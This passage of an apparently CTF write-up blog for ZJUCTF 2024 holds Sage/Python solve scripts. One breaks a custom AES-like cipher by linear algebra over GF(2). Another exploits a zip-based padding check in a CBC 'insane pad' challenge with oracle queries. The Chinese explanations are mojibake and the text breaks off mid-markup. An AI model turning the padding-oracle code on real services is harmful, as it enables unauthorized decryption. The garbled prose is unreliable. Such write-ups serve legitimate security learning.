çŸ©é˜µï¼Œå¯¹ansè¿›è¡Œå¤„ç†å‡å»å·²çŸ¥å­—èŠ‚è¡Œï¼Œå‘ç°ç§©æ˜¯110ï¼Œä½†æ˜¯è¿™æ—¶è¿˜æ˜¯128çš„è¾“å…¥ï¼Œsageåº“æ— æ³•è§£éæ»¡ç§©æ–¹ç¨‹ï¼Œäºæ˜¯å°±å¾—çˆ†ç ´çº¿æ€§ç›¸å…³çš„18ç»„å¯¹åº”çš„å€¼ï¼Œå¯¹æ¯ä¸ªå¯èƒ½è§£æ–¹ç¨‹ï¼Œçœ‹ç»“æœæ˜¯å¦ç¬¦åˆflagï¼š</li><li>å‡å»å·²çŸ¥è¡Œæ±‚ç§©ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">import</span> copy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">flaglis,keylis</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):    <span class="hljs-comment">#len(flaglis)</span><br>        flaglis[i] ^= keylis[i&amp;<span class="hljs-number">7</span>]<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">what</span>(<span class="hljs-params">a,b</span>):<br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        <span class="hljs-keyword">if</span> b&amp;<span class="hljs-number">1</span>!=<span class="hljs-number">0</span>:<br>            tmp^=a<br>        a = (a*<span class="hljs-number">2</span>)%(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">if</span> a&gt;=<span class="hljs-number">2</span>**<span class="hljs-number">7</span>:<br>            a^=<span class="hljs-number">0x1b</span><br>        b = b&gt;&gt;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> tmp<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alpha</span>(<span class="hljs-params">flagpiece,index</span>):<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> i&gt;=index:<br>            <span class="hljs-keyword">break</span><br>        flagpiece = flagpiece[<span class="hljs-number">1</span>:]+flagpiece[:<span class="hljs-number">1</span>]<br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> flagpiece<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">beta</span>(<span class="hljs-params">tmp</span>):<br>    newflagpiece = [<span class="hljs-number">0</span>]*<span class="hljs-number">4</span><br>    newflagpiece[<span class="hljs-number">0</span>] = what(tmp[<span class="hljs-number">0</span>],<span class="hljs-number">2</span>)^what(tmp[<span class="hljs-number">1</span>],<span class="hljs-number">3</span>)^what(tmp[<span class="hljs-number">2</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">3</span>],<span class="hljs-number">1</span>)<br>    newflagpiece[<span class="hljs-number">1</span>] = what(tmp[<span class="hljs-number">0</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">1</span>],<span class="hljs-number">2</span>)^what(tmp[<span class="hljs-number">2</span>],<span class="hljs-number">3</span>)^what(tmp[<span class="hljs-number">3</span>],<span class="hljs-number">1</span>)<br>    newflagpiece[<span class="hljs-number">2</span>] = what(tmp[<span class="hljs-number">0</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">1</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">2</span>],<span class="hljs-number">2</span>)^what(tmp[<span class="hljs-number">3</span>],<span class="hljs-number">3</span>)<br>    newflagpiece[<span class="hljs-number">3</span>] = what(tmp[<span class="hljs-number">0</span>],<span class="hljs-number">3</span>)^what(tmp[<span class="hljs-number">1</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">2</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">3</span>],<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">return</span> newflagpiece<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magicspell1</span>(<span class="hljs-params">flaglis</span>):<br>    <span class="hljs-comment"># print(flaglis)</span><br>    newflaglis = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        newflaglis.extend(alpha(flaglis[i*<span class="hljs-number">4</span>:i*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>],i))<br>    <span class="hljs-keyword">return</span> newflaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magicspell2</span>(<span class="hljs-params">flaglis</span>):<br>    flagpiece = [<span class="hljs-number">0</span>]*<span class="hljs-number">4</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            flagpiece[j] = flaglis[<span class="hljs-number">4</span>*j+i]<br>        res = beta(flagpiece)<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            flaglis[<span class="hljs-number">4</span>*k+i] = res[k]<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic</span>(<span class="hljs-params">flaglis,keylis,times=<span class="hljs-number">0xaaa</span></span>):<br>    flaglis = add(flaglis,keylis)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,times):<br>        flaglis = magicspell1(flaglis)<br>        flaglis = magicspell2(flaglis)<br>    flaglis = magicspell1(flaglis)<br>    flaglis = add(flaglis,keylis)<br>    <span class="hljs-keyword">return</span> flaglis<br><br>length = (<span class="hljs-number">16</span>+<span class="hljs-number">8</span>)*<span class="hljs-number">8</span><br>anslength = <span class="hljs-number">128</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>(<span class="hljs-params">key</span>):<br>    <span class="hljs-keyword">global</span> check<br>    inputs = [<span class="hljs-string">&#x27;0&#x27;</span>]*length<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        inputs[i]=<span class="hljs-built_in">str</span>(key%<span class="hljs-number">2</span>)<br>        key = key&gt;&gt;<span class="hljs-number">1</span><br>    tmp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,length,<span class="hljs-number">8</span>):<br>        tmp.append(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(inputs[i:i+<span class="hljs-number">8</span>]),<span class="hljs-number">2</span>))<br>    flaglis = tmp[:<span class="hljs-number">16</span>]<br>    keylis = tmp[<span class="hljs-number">16</span>:]<br>    res = magic(flaglis,keylis)<br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mykey</span>():<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i&lt;(length):<br>        key = <span class="hljs-number">1</span>&lt;&lt;(length-i-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">yield</span> generate(key)<br>        i+=<span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getRow</span>():<br>    temp = mykey()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>        s = <span class="hljs-built_in">next</span>(temp)<br>        row = vector(GF(<span class="hljs-number">2</span>),[<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> s <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> t])<br>        <span class="hljs-keyword">yield</span> row<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buildBox</span>():<br>    box = matrix(GF(<span class="hljs-number">2</span>),length,anslength)<br>    rg = getRow()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(length)):<br>        box[i] = <span class="hljs-built_in">next</span>(rg)<br>    <span class="hljs-keyword">return</span> box<br><br><span class="hljs-comment"># b_192_128 = buildBox()</span><br><span class="hljs-comment"># with open(&#x27;box.txt&#x27;,&#x27;w&#x27;) as f:</span><br><span class="hljs-comment">#     f.write(str(b_192_128))</span><br>b_192_128 = matrix(GF(<span class="hljs-number">2</span>),length,anslength)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;box.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    rowcnt = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>        b_192_128[i] = vector(GF(<span class="hljs-number">2</span>),[<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> f.readline().strip().replace(<span class="hljs-string">&#x27;[&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;]&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).split(<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> t])<br><br>testflag = <span class="hljs-string">&quot;ZJUCTF&#123;11451419&#125;&quot;</span><br>testkey = <span class="hljs-string">&quot;hahahaha&quot;</span><br>ans = magic([<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> testflag],[<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> testkey])<br><span class="hljs-built_in">print</span>(ans)<br>b_flag = vector(GF(<span class="hljs-number">2</span>), [<span class="hljs-built_in">int</span>(t) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> testflag+testkey] <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> x])<br>leak = vector(GF(<span class="hljs-number">2</span>), [<span class="hljs-built_in">int</span>(t) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ans] <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> x])<br><span class="hljs-keyword">assert</span> b_flag*b_192_128==leak<br><br>knownindex = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>*<span class="hljs-number">8</span>)]+[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>*<span class="hljs-number">8</span>,<span class="hljs-number">16</span>*<span class="hljs-number">8</span>)]<br>known = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ZJUCTF&#123;********&#125;&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(j))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)]<br>b_128_128 = matrix(GF(<span class="hljs-number">2</span>),length-<span class="hljs-built_in">len</span>(knownindex),anslength)<br>test = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> testflag[<span class="hljs-number">7</span>:<span class="hljs-number">15</span>]+testkey])<br>new_flag = vector(GF(<span class="hljs-number">2</span>), [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> test])<br>newleak = leak<br>b_index = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> knownindex:<br>        b_128_128[b_index] = b_192_128[i]<br>        b_index+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(anslength):<br>            newleak[j] = newleak[j]+known[i]*b_192_128[i,j]<br><span class="hljs-keyword">assert</span> new_flag*b_128_128==newleak<br><span class="hljs-built_in">print</span>(b_128_128.rank())  <span class="hljs-comment">#110</span><br></code></pre></td></tr></table></figure></li><li>é€‰å–æ°å½“çš„çˆ†ç ´è¡Œä½¿å¾—çŸ©é˜µçš„ç§©ä¸å˜: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">b = b_128_128.transpose()<br>echelon_b = b.echelon_form()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;é˜¶æ¢¯å½¢çŸ©é˜µ:&quot;</span>)<br><span class="hljs-built_in">print</span>(echelon_b)<br><br>choices = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>    choices.append([])<br><br>rows, cols = echelon_b.nrows(), echelon_b.ncols()<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(cols):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rows-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> echelon_b[i, j] == <span class="hljs-number">1</span>:<br>            choices[i].append(j)<br>            <span class="hljs-keyword">break</span> <br><span class="hljs-built_in">print</span>(choices)<br><br>b_110_128 = matrix(GF(<span class="hljs-number">2</span>),<span class="hljs-number">110</span>,anslength)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">110</span>):<br>    b_110_128[i] = b_128_128[i]<br>b_110_128[<span class="hljs-number">80</span>] = b_128_128[<span class="hljs-number">110</span>]<br>b_110_128[<span class="hljs-number">88</span>] = b_128_128[<span class="hljs-number">111</span>]<br><span class="hljs-built_in">print</span>(b_110_128.rank())<br></code></pre></td></tr></table></figure></li><li>çˆ†ç ´å¯¹åº”è¡Œçš„å€¼ï¼Œè¾“å‡ºç»“æœ: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python">ans = [<span class="hljs-number">0xd5</span>,<span class="hljs-number">0xe3</span>,<span class="hljs-number">0x98</span>,<span class="hljs-number">0xc6</span>,<span class="hljs-number">0x94</span>,<span class="hljs-number">0xc2</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0xb7</span>,<span class="hljs-number">0xd6</span>,<span class="hljs-number">0x8f</span>,<span class="hljs-number">0xd5</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x4b</span>,<span class="hljs-number">0x87</span>,<span class="hljs-number">0xe0</span>]<br>leak = vector(GF(<span class="hljs-number">2</span>), [<span class="hljs-built_in">int</span>(t) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ans] <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> x])<br>knownindex = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>*<span class="hljs-number">8</span>)]+[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>*<span class="hljs-number">8</span>,<span class="hljs-number">16</span>*<span class="hljs-number">8</span>)]<br>known = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ZJUCTF&#123;********&#125;&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(j))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)]<br>b_128_128 = matrix(GF(<span class="hljs-number">2</span>),length-<span class="hljs-built_in">len</span>(knownindex),anslength)<br>newleak = leak<br>b_index = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> knownindex:<br>        b_128_128[b_index] = b_192_128[i]<br>        b_index+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(anslength):<br>            newleak[j] = newleak[j]+known[i]*b_192_128[i,j]<br><br><span class="hljs-built_in">print</span>(b_128_128.rank())<br>guesslen = anslength-b_128_128.rank()<br>guesskindex = [<span class="hljs-number">80</span>-<span class="hljs-number">8</span>,<span class="hljs-number">88</span>-<span class="hljs-number">8</span>]+[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(anslength-guesslen+<span class="hljs-number">2</span>,anslength)]<br>b_110_128 = matrix(GF(<span class="hljs-number">2</span>),anslength-guesslen,anslength)<br>tmp = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(anslength-guesslen):<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> guesskindex:<br>        b_110_128[tmp]=b_128_128[i]<br>        tmp+=<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**guesslen):<br>    guessk = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(guesslen)]<br>    tmpleak = copy.deepcopy(newleak)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(guessk)==guesslen<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(guesslen):<br>        <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(anslength):<br>            <span class="hljs-comment"># print(guesskindex[j])</span><br>            tmpleak[z] = tmpleak[z]+guessk[j]*b_128_128[guesskindex[j],z]<br>    <span class="hljs-keyword">try</span>:<br>        tmp = b_110_128.solve_left(tmpleak)<br>        <span class="hljs-comment"># print(tmp)</span><br>        flag = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp])[:<span class="hljs-number">64</span>]<br>        <span class="hljs-built_in">print</span>(i,end=<span class="hljs-string">&quot; &quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">8</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(flag[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>)),end=<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>()<br>        <span class="hljs-comment"># break</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment"># ZJUCTF&#123;M47rlx!?&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/18.png"></li></ul><h2 id="insane-pad">insane pad</h2><ul><li>ä¹ä¸€çœ‹è¿™ä¸€é“CBCå¡«å……æ¼æ´é¢˜æ— ä»ä¸‹æ‰‹ï¼Œå‰ä¸¤ä¸ªé€‰é¡¹è¿”å›AESåŠ å¯†çš„flagå’ŒhashåŠ å¯†çš„flagï¼Œç¬¬ä¸‰ä¸ªé€‰é¡¹è¿›è¡Œverifyï¼Œä½†æ˜¯å…³é”®åœ¨äºæ¯”å¯¹æ—¶å®ƒç”¨äº†zipï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">msg = <span class="hljs-variable language_">self</span>.decrypt(ct, iv)<br><span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(<span class="hljs-variable language_">self</span>.flag, msg):<br>    <span class="hljs-keyword">if</span>(a != b):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invaild!&quot;</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Valid!&quot;</span><br></code></pre></td></tr></table></figure></li><li>zipæ˜¯é€ä¸ªå­—ç¬¦æ¯”å¯¹ï¼Œé‚£å°±å¯ä»¥è®¾è®¡æœ€åä¸€ä½padï¼Œä½¿å¾—msgä¸ºç©ºï¼Œé‚£ä¹ˆå°±ä¼šverifyè¿”å›validã€‚flagæ€»é•¿åº¦ä¸º64-80ï¼Œåªè¦åˆ¤æ–­æ„é€ æœ€åä¸€ä½èŒƒå›´æ˜¯80-256æˆ–0éƒ½èƒ½ä½¿msgä¸ºç©ºï¼Œä»è€Œå¾—åˆ°validï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getvalue16</span>(<span class="hljs-params">block,possiblevalue,lastblock</span>):<br>    tmp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        test = <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">63</span>+<span class="hljs-built_in">bytes</span>([i])+block<br>        <span class="hljs-keyword">if</span> verify(test):<br>            tmp.append(i)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> possiblevalue:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> tmp:<br>            <span class="hljs-keyword">if</span> <span class="hljs-number">0</span>&lt;i^lastblock[-<span class="hljs-number">1</span>]^j&lt;<span class="hljs-number">80</span>:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> i<br></code></pre></td></tr></table></figure></li><li>å¾—åˆ°æœ€åä¸€ä½è§£å¯†æ•°æ®å°±å¯ä»¥éšå¿ƒæ‰€æ¬²æ§åˆ¶msgé•¿åº¦äº†ï¼Œå†æ ¹æ®å·²çŸ¥flagçš„å¼€å¤´æ˜¯ZJUCTF{ å’Œ æœ«å°¾æ˜¯ } åŠ ä¸Š4ä¸ªpaddingï¼Œå°±å¯ä»¥è·å¾—æ¯ä¸€ä¸ªå—çš„ 0-6 å’Œ 11-15 ä½ç½®ä¸Šæ•°æ®: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 